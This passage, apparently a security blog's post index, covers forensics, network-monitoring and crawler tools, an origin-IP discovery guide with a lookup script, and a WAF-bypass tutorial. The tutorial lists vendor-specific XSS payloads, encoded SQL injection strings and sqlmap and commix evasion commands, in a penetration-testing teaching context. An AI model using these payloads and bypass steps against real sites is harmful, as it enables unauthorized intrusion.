metadata in your preferred format for further analysis.  Visualization: Use charts and graphs to visualize metadata distributions, timelines, and comparisons.Code StructureThe project is organized into modular components for clarity and maintainability:  AppConfig: Handles application configuration and user preferences.  MetadataExtractor: Extracts and processes metadata from files.  FileProcessor: Performs batch processing and file operations.  PDFInjector: Injects JavaScript into PDFs for testing purposes.  SignatureSpoof: Modifies file headers to test forensic tools.  UIComponents: Implements the graphical user interface using tkinter.This modular structure ensures that each component is reusable and easy to extend.InterfaceBelow are some screenshots of the tool’s interface:Future EnhancementsWe have several exciting features planned for future updates:  Cloud Integration: Allow users to upload and analyze files directly from cloud storage services.  AI-Based Threat Detection: Use machine learning to detect anomalies and potential threats in files.  Cross-Platform Support: Expand compatibility to include mobile platforms.  Enhanced Visualization: Add more advanced charts and interactive visualizations.  Real-Time Collaboration: Enable multiple users to collaborate on file analysis in real-time.Ethical ConsiderationsThe Digital-Forensics-Toolkit is designed for educational and forensic research purposes only. It is crucial to use this tool responsibly and ethically:  Respect Privacy: Do not use this tool to analyze files without proper authorization.  Legal Compliance: Ensure that your use of this tool complies with local laws and regulations.  Educational Use: Features like PDF JavaScript injection and file signature spoofing are intended for learning and testing purposes only. Misuse of these features can lead to legal consequences.By using this tool, you agree to adhere to ethical guidelines and take full responsibility for its usage.Additional TopicsSupported File TypesThe toolkit supports a wide range of file types, including:  Images: .jpg, .png, .gif, .bmp, .tiff  Documents: .pdf, .docx, .txt, .rtf  Audio: .mp3, .wav, .flac  Video: .mp4, .avi, .mkv  Archives: .zip, .rar, .7zPerformance OptimizationThe toolkit uses multithreading for batch processing, ensuring efficient handling of large datasets. It also includes progress indicators to keep users informed during long operations.Community ContributionsWe welcome contributions from the community! If you’d like to contribute, please fork the repository and submit a pull request. For major changes, please open an issue first to discuss your ideas."
  },
  
  {
    "title": "Network Monitor",
    "url": "/posts/python-network-monitor",
    "categories": "Python, Network Monitor",
    "tags": "Python, Network Monitor",
    "date": "2025-01-19 00:00:00 +0000",
    





    
    "snippet": "A Python-based desktop application to monitor and analyze real-time network traffic, system performance, and packet details.Network Monitor Repository  Link: Network Monitor RepositoryFeatures  Rea...",
    "content": "A Python-based desktop application to monitor and analyze real-time network traffic, system performance, and packet details.Network Monitor Repository  Link: Network Monitor RepositoryFeatures  Real-Time Packet Capture: Capture and analyze network packets as they flow through your system.  Packet Filtering: Filter packets by protocol (e.g., TCP, UDP) or IP address for focused analysis.  Location &amp; Service Detection: Automatically detect the location and service associated with destination IPs using an external API.  Data Export: Export captured data in CSV, JSON, or HTML formats for offline analysis.  System Monitoring: Track CPU, memory, disk, and network usage with warnings for high resource utilization.  Visualizations: View real-time bandwidth usage, protocol distribution, and system performance graphs.  Auto-Scroll: Automatically scroll through captured packets for continuous monitoring.  Dark/Light Theme: Toggle between light and dark themes for better usability.How It WorksThe Network-Monitor tool captures network packets using the scapy library and analyzes them in real-time. Each packet’s details, such as source/destination IPs, protocol, size, and encryption status, are extracted and displayed in a user-friendly interface. The tool also integrates with the ipapi.com API to fetch location and service information for destination IPs.Captured data is stored in an SQLite database for later retrieval and can be exported in multiple formats (CSV, JSON, HTML). System performance metrics like CPU and memory usage are monitored using the psutil library, and visualizations are created using matplotlib and plotly.Code StructureThe project is organized into modular components for clarity and maintainability:  modules/data_manager.py: Handles database operations and data exports.  modules/packet_analyzer.py: Analyzes captured packets and extracts details like protocol, size, and encryption status.  modules/system_monitor.py: Monitors system resources (CPU, memory, disk, network).  modules/visualizer.py: Creates visualizations for bandwidth usage, protocol distribution, and system performance.  main.py: The main application file that ties everything together and provides the GUI.This modular structure makes it easy to extend or modify specific functionalities without affecting the entire codebase.InterfaceFuture EnhancementsWe’re continuously working to improve the Network-Monitor tool. Here are some planned enhancements:  Advanced Filtering: Add more filtering options, such as port numbers and packet size ranges.  Enhanced Visualizations: Include heatmaps and more detailed graphs for deeper insights.  Cross-Platform Support: Ensure seamless operation on Windows, macOS, and Linux.  Customizable Alerts: Allow users to set custom thresholds for system resource warnings.  API Integration: Add support for additional APIs to enhance location and service detection.  Offline Mode: Provide offline functionality for environments without internet access."
  },
  
  {
    "title": "WAF Bypass: Techniques, Tools, and Tactics for Penetration Testers",
    "url": "/posts/waf-bypass",
    "categories": "Exploits, WAF Bypass",
    "tags": "Exploits, WAF Bypass, Web Application Security",
    "date": "2025-01-17 00:00:00 +0000",
    





    
    "snippet": "Bypassing Web Application Firewalls (WAFs): Techniques, Tools, and Tactics for Penetration TestersTable of Contents  What is a Web Application Firewall (WAF)?  Purpose of a WAF  How Does a WAF Work...",
    "content": "Bypassing Web Application Firewalls (WAFs): Techniques, Tools, and Tactics for Penetration TestersTable of Contents  What is a Web Application Firewall (WAF)?  Purpose of a WAF  How Does a WAF Work?  Famous WAF Services  The Importance of a WAF in Vulnerability Protection  Top 10 Ways to Bypass a WAF  Advanced WAF Bypass Techniques  Tools to Bypass WAFs  XSS Bypass Techniques and Payloads  Real-World Examples of WAF Bypasses  Best Practices for Defenders  ConclusionWhat is a Web Application Firewall (WAF)?A Web Application Firewall (WAF) is a security mechanism that monitors, filters, and blocks HTTP/HTTPS traffic to and from a web application. Its primary purpose is to protect web applications from common cyber threats like cross-site scripting (XSS), SQL injection (SQLi), file inclusion attacks, and other types of malicious payloads. WAFs analyze the data that flows between the internet and a web application, looking for patterns of attack and preventing potentially harmful traffic from reaching the application.Purpose of a WAFThe role of a WAF in a security strategy is critical because web applications are increasingly targeted by hackers. As more organizations move services online, they become prime targets for attackers looking to steal data, disrupt services, or gain unauthorized access to sensitive systems.A WAF provides several key functions:  Traffic Filtering: Inspects incoming HTTP requests and blocks malicious traffic based on predefined rules.  Attack Prevention: Actively mitigates the risk of common web vulnerabilities, including XSS, SQL injection, remote file inclusion (RFI), and others.  Access Control: Restricts access to certain parts of a web application, ensuring only authorized users can access sensitive data.  DDoS Mitigation: Some WAFs provide built-in protection against distributed denial of service (DDoS) attacks.How Does a WAF Work?WAFs typically operate at the application layer (Layer 7) of the OSI model, monitoring HTTP/HTTPS requests. They are placed in front of a web application to inspect traffic before it reaches the application server. WAFs rely on various detection mechanisms, including:  Signature-based Detection: Compares traffic against known attack patterns.  Behavioral Analysis: Identifies abnormal behavior that deviates from the norm.  Rule-based Detection: Administrators can define custom rules for specific attack patterns.Famous WAF ServicesSeveral companies offer Web Application Firewall services, some of the most notable include:  AWS Web Application Firewall (AWS WAF)  Cloudflare WAF  Imperva WAF  F5 Advanced WAF  Azure Web Application FirewallThe Importance of a WAF in Vulnerability ProtectionA properly configured WAF plays a vital role in securing applications. However, it’s important to understand that WAFs are not foolproof. Despite their ability to block many common attacks, they can often be bypassed by skilled attackers. For cybersecurity professionals, particularly penetration testers and red teams, understanding how WAFs function and the weaknesses in their detection systems is key to finding vulnerabilities.Top 10 Ways to Bypass a WAF  Payload Encoding and Obfuscation          Techniques: Hex encoding, Base64 encoding, URL encoding.      Example: %53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20%75%73%65%72%73%20%57%48%45%52%45%20%69%64%20%3D%201;        HTTP Parameter Pollution          Example: GET /login?username=admin&amp;password=admin123&amp;password=malicious_payload        Case Transformation          Example: SeLeCt * FrOm users WhErE username = 'admin';        IP Fragmentation          Example: Splitting payloads into multiple IP packets.        JSON and XML Payloads          Example: Injecting malicious code into JSON/XML formats.        Session Awareness Bypassing          Example: Spreading attacks across multiple requests.        404 Bypassing          Example: Targeting non-existent pages to reduce WAF scrutiny.        DNS-Based Attacks          Example: Sending requests directly to the server’s IP address.        Rate Limiting Bypass          Example: Distributing requests across a botnet.        Exploiting Zero-Day Vulnerabilities          Example: Using unpatched flaws in software.      Advanced WAF Bypass Techniques1. Polyglot Payloads  Polyglot payloads are designed to work in multiple contexts (e.g., HTML, JavaScript, SQL).  Example: &lt;script&gt;/*&lt;/script&gt;&lt;svg onload=alert(1)&gt;*/2. Time-Based Attacks  Exploiting time delays in WAF processing to bypass detection.  Example: Using SLEEP() in SQL injection payloads.3. Content-Type Manipulation  Changing the Content-Type header to confuse the WAF.  Example: Sending a JSON payload with Content-Type: text/plain.4. Chunked Encoding  Splitting payloads into chunks to evade detection.  Example: Using Transfer-Encoding: chunked in HTTP requests.Tools to Bypass WAFsHere are some popular tools used to bypass WAFs:  SQLMap          Features: Payload encoding, tamper scripts.      Command: python sqlmap.py -u \"&lt;http://target.com/page.php?id=1&gt;\" --tamper=between,randomcase        WAFNinja          Features: Payload obfuscation, fragmentation.      Command: python wafninja.py -u \"&lt;http://target.com/page&gt;\" --method get --payloads sql_injection.txt        Nmap with NSE Scripts          Features: HTTP fragmentation, custom user-agent injection.      Command: nmap --script http-waf-detect target.com        Burp Suite with Extensions          Features: Payload encoding, fuzzing.      Example: Use the Bypass WAF extension.        Commix          Features: Command injection payloads.      Command: python commix.py --url=\"&lt;http://target.com/page.php?id=1&gt;\" --waf-bypass        OWASP ZAP          Features: Fuzzing, scripting.      Example: Use custom scripts to test WAF evasion.      XSS Bypass Techniques and PayloadsCommon Techniques  Obfuscation          Example: &lt;img src=x onerror=\"/*&lt;![CDATA[*/alert(1)/*]]&gt;*/\"&gt;        Alternate Event Handlers          Example: &lt;div style=\"width:expression(alert(1))\"&gt;&lt;/div&gt;        Polyglot Payloads          Example: &lt;script&gt;/*&lt;/script&gt;&lt;svg onload=alert(1)&gt;*/        Payload Splitting          Example: &lt;img src='1' onerror='ja'+'vascript:alert(1)'&gt;        Manipulating Headers          Example: Injecting malicious content into HTTP headers.      WAF-Specific Payloads  Akamai: &lt;style&gt;@keyframes a{}b{animation:a;}&lt;/style&gt;&lt;b/onanimationstart=prompt ${document.domain}&amp;#x60;&gt;  Cloudflare: &lt;a\"/onclick=(confirm)()&gt;Click Here!  Imperva: &lt;x/onclick=globalThis&amp;lsqb;'\\u0070r\\u006f'+'mpt']&amp;lt;)&gt;clickme  Incapsula: &lt;iframe/onload='this[\"src\"]=\"javas&amp;Tab;cript:al\"+\"ert\"';&gt;  WordFence: &lt;meter onmouseover=\"alert(1)\"Real-World Examples of WAF Bypasses  Cloudflare WAF Bypass          Attackers used chunked encoding to bypass Cloudflare’s detection mechanisms.      Example: Splitting payloads into multiple chunks to evade signature-based detection.        AWS WAF Bypass          Exploiting misconfigurations in AWS WAF rules to inject malicious payloads.      Example: Using JSON payloads with malformed syntax to bypass detection.        Imperva WAF Bypass          Attackers used polyglot payloads to exploit Imperva’s rule-based detection.      Example: Combining HTML, JavaScript, and SQL in a single payload.      Best Practices for Defenders  Regular Updates: Keep WAF signatures and rules up-to-date.  Defense-in-Depth: Use multiple layers of security (e.g., input validation, CSP).  Security Testing: Perform regular penetration testing and security assessments.  Behavioral Analysis: Implement machine learning-based behavioral analysis to detect anomalies.  Logging and Monitoring: Continuously monitor WAF logs for suspicious activity.ConclusionWhile WAFs are powerful tools for defending web applications, they are not invulnerable. Attackers constantly develop new methods to bypass these defenses, and the techniques and tools discussed above are instrumental in identifying vulnerabilities that may be missed by a WAF. For security professionals, it’s essential to stay informed about the latest bypass techniques and ensure WAF configurations are up to date."
  },
  
  {
    "title": "Discover the Origin IP Address of a Website and Identify WAF Protection",
    "url": "/posts/find-origin-ip-website",
    "categories": "Guides, Discover Origin IP Address of a Website and Identify WAF",
    "tags": "Guides, Origin IP, Identify WAF",
    "date": "2025-01-15 00:00:00 +0000",
    





    
    "snippet": "Web application firewalls (WAFs) and content delivery networks (CDNs) are commonly employed to enhance website security. These technologies often obscure the true IP address of a server, adding an ...",
    "content": "Web application firewalls (WAFs) and content delivery networks (CDNs) are commonly employed to enhance website security. These technologies often obscure the true IP address of a server, adding an additional layer of protection that can complicate security assessments and bug bounty testing. However, uncovering the source IP address allows you to bypass these layers and directly assess the server, potentially revealing vulnerabilities hidden by the WAF or CDN.This guide will explore methods for identifying whether a website is behind a WAF/CDN and techniques for discovering its origin IP address.Step 1: Identifying if a Website is Behind a WAF/CDNBefore attempting to find the origin IP, it’s crucial to confirm whether the website is protected by a WAF or CDN. Here are some methods to achieve this:1.1 Ping TestPerform a simple ping test to gather initial information about the IP address associated with the domain:ping target.comIf the IP resolves to a known CDN/WAF provider (e.g., Cloudflare, Amazon CloudFront, Akamai), it indicates the presence of such protection.1.2 Browser ExtensionsUse browser extensions like Wappalyzer to detect CDNs and WAFs. Simply visit the target website and check for any indicators of protection mechanisms.1.3 WafWOOF ToolWafWOOF is a specialized tool designed to identify WAFs. Run the following command:wafw00f https://target.comThis will reveal whether a WAF is in place and specify which one.1.4 WHOIS LookupA WHOIS lookup can provide insights into the hosting provider. If the registrar or hosting details point to a CDN/WAF vendor, it confirms their usage.Step 2: Methods for Discovering the Origin IP AddressOnce you’ve determined that a WAF/CDN is present, proceed with the following techniques to uncover the origin IP address:2.1 DNSReconDNSRecon performs reverse DNS lookups and may expose the origin IP if the server lacks robust WAF protection:dnsrecon -d target.com2.2 Shodan DorksLeverage Shodan’s search capabilities to locate leaked IPs:ssl.cert.subject.CN:\"&lt;DOMAIN&gt;\" 200For automated results, combine Shodan CLI with HTTPX:shodan search ssl.cert.subject.CN:\"&lt;DOMAIN&gt;\" 200 --fields ip_str | httpx-toolkit -sc -title -server -td2.3 CensysCensys is another powerful tool for IP discovery. Search for the target domain and review IPv4 entries matching SSL certificates or host details:https://search.censys.io/hosts?q=&lt;DOMAIN&gt;2.4 SecurityTrailsSecurityTrails offers historical DNS records, which can be invaluable for identifying past IP associations:https://securitytrails.com/domain/&lt;DOMAIN&gt;/history/a2.5 FOFAFOFA excels at finding specific server configurations. Use the favicon hash for refined results:https://fofa.info/Steps:  Extract the favicon URL from the website.  Generate its hash using tools like favicon-hash.  Search for the hash in FOFA.2.6 ZoomEyeSimilar to Shodan, ZoomEye indexes internet devices. Perform a domain search and filter results by favicon hash:https://www.zoomeye.org/searchResult?q=&lt;DOMAIN&gt;2.7 ViewDNS.infoViewDNS provides historical DNS records, including previous IP addresses:https://viewdns.info/iphistory/?domain=&lt;DOMAIN&gt;2.8 SPF RecordsSPF records list authorized sending IPs for email. While not always indicative of the web server, they can sometimes reveal relevant IPs:https://mxtoolbox.com/SuperTool.aspx?action=spf:&lt;DOMAIN&gt;2.9 VirusTotalVirusTotal aggregates data from multiple sources, making it useful for discovering subdomains and associated IPs:https://www.virustotal.com/gui/domain/&lt;DOMAIN&gt;/details2.10 AlienVault OTXAlienVault Open Threat Exchange (OTX) offers threat intelligence data, including IP mappings:https://otx.alienvault.com/indicator/hostname/&lt;DOMAIN&gt;2.11 Custom Bash ScriptCombine VirusTotal and AlienVault outputs into a single script for streamlined results:#!/bin/bash# API keys (replace with your own keys)VT_API_KEY=\"&lt;api_key&gt;\"OTX_API_KEY=\"&lt;api_key&gt;\"# Function to fetch IP addresses from VirusTotalfetch_vt_ips() {    local domain=$1    curl -s \"https://www.virustotal.com/vtapi/v2/domain/report?domain=$domain&amp;apikey=$VT_API_KEY\" \\        | jq -r '.. | .ip_address? // empty' \\        | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'}# Function to fetch IP addresses from AlienVaultfetch_otx_ips() {    local domain=$1    curl -s -H \"X-OTX-API-KEY: $OTX_API_KEY\" \"https://otx.alienvault.com/api/v1/indicators/hostname/$domain/url_list?limit=500&amp;page=1\" \\        | jq -r '.url_list[]?.result?.urlworker?.ip // empty' \\        | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'}# Check if domain is providedif [ -z \"$1\" ]; then    echo \"Usage: $0 &lt;domain_name_or_url&gt;\"    exit 1fiDOMAIN=$1OUTPUT_FILE=\"${DOMAIN}_ips.txt\"# Get IPs from both sources, remove duplicates, and save to fileecho \"Collecting IP addresses for: $DOMAIN\"{    fetch_vt_ips $DOMAIN    fetch_otx_ips $DOMAIN} | sort -u &gt; \"$OUTPUT_FILE\"echo \"IP addresses saved to: $OUTPUT_FILE\"Step 3: Verifying the Origin IPAfter identifying potential IPs, verify them through the following steps:3.1 /etc/hosts FileModify your /etc/hosts file to map the domain to the suspected IP:&lt;ORIGIN_IP&gt; target.comReload the browser and observe if the site loads correctly without WAF intervention.3.2 Nmap Certificate CheckUse Nmap to inspect the SSL certificate of the IP:nmap --script ssl-cert -p 443 &lt;ORIGIN_IP&gt;Ensure the certificate matches the target domain.3.3 Burp Suite TestingConfigure Burp Suite to route traffic through the discovered IP:  Set the upstream proxy to the origin IP.  Intercept requests and confirm responses originate from the backend server.Tips for Bug Bounty Hunters  Avoid Premature Reporting: Once you discover the origin IP, thoroughly explore it for vulnerabilities like SQL injection, XSS, or misconfigurations before submitting findings.  Test Without WAF: With direct access to the backend server, exploit testing becomes significantly easier due to the absence of WAF filtering.  Document Your Process: Maintain detailed records of your methodology and discoveries for transparency during reporting."
  },
  
  {
    "title": "Web Crawler",
    "url": "/posts/python-web-crawler",
    "categories": "Python, Web Crawler",
    "tags": "Python, Web Crawler",
    "date": "2025-01-12 00:00:00 +0000",
    





    
    "snippet": "A GUI-based Python tool for crawling websites, managing proxies, respecting robots.txt rules, and exporting data in HTML, JSON, or CSV formats.Web Crawler Repository  Link: Web Crawler RepositoryFe...",
    "content": "A GUI-based Python tool for crawling websites, managing proxies, respecting robots.txt rules, and exporting data in HTML, JSON, or CSV formats.Web Crawler Repository  Link: Web Crawler RepositoryFeatures  GUI Interface: A user-friendly graphical interface for configuring and controlling the crawler.  Robots.txt Compliance: Automatically checks and respects website crawling rules defined in robots.txt.  Proxy Management: Supports proxy rotation to avoid IP blocking during large-scale crawls.  URL Filtering: Includes and excludes URLs based on customizable patterns and domain restrictions.  Real-Time Statistics: Displays live metrics such as pages crawled, memory usage, queue size, and errors.  Data Visualization: Provides dynamic graphs for crawl speed, memory usage, and URLs in the queue.  Export Options: Export crawled data in HTML, JSON, or CSV formats for further analysis.  Pause/Resume/Stop: Full control over the crawling process with pause, resume, and stop functionality.  Concurrency: Configurable number of concurrent workers for efficient crawling.How It WorksThe Enhanced Web Crawler is a Python-based desktop application designed to extract structured data from websites while adhering to ethical crawling practices. Here’s how it works:  Input Configuration:          Enter the starting URL, maximum depth, and other settings like the number of concurrent workers and rate limits.      Add include/exclude URL patterns to filter which pages should be crawled.        Crawling Process:          The tool checks robots.txt compliance before crawling any page.      It uses proxies (if configured) to rotate IPs and avoid being blocked.      URLs are processed concurrently using a thread pool, ensuring efficient crawling.        Data Extraction:          Extracts metadata such as page titles, links, and timestamps.      Stores the crawled data in memory for real-time updates and visualization.        Monitoring and Export:          Real-time statistics and visualizations help monitor the crawling process.      Once crawling is complete, export the results in HTML, JSON, or CSV formats for further analysis.      Code StructureThe project is organized into modular components for clarity and maintainability:  crawler/: Core functionality for crawling, proxy management, robots.txt parsing, and statistics tracking.          proxy_manager.py: Manages proxy rotation.      robots.py: Handles robots.txt compliance.      stats.py: Tracks crawling statistics.      url_filter.py: Filters URLs based on patterns and domains.        gui/: Implements the graphical user interface.          dashboard.py: Displays real-time statistics and logs.      visualization.py: Provides dynamic graphs for monitoring the crawl process.        webcrawler.py: Entry point of the application, initializes the GUI and starts the crawler.InterfaceThe interface includes:  Crawler Tab: Configure settings, start/pause/stop crawling, and view status.  Dashboard Tab: Monitor real-time statistics and logs.  Visualization Tab: View dynamic graphs for crawl speed, memory usage, and URLs in the queue.Future Enhancements  Advanced Export Options: Support additional export formats like XML or Excel.  Improved Proxy Handling: Add support for authenticated proxies and automatic proxy fetching.  Database Integration: Store crawled data directly in a database for large-scale projects.  Enhanced Visualizations: Add more detailed graphs and analytics for crawled data.  Error Recovery: Implement automatic retry mechanisms for failed requests.Ethical ConsiderationsThe Enhanced Web Crawler is designed with ethical considerations in mind:  Respect for Robots.txt: The tool automatically checks and adheres to robots.txt rules to ensure compliance with website policies.  Rate Limiting: Users can configure rate limits to avoid overloading servers with too many requests.  Proxy Rotation: Helps distribute requests across multiple IPs, reducing the risk of overwhelming a single server.  Transparency: Clear documentation ensures users understand how to use the tool responsibly.Always ensure that you have permission to crawl a website and that your actions comply with applicable laws and terms of service."
  }
  
]

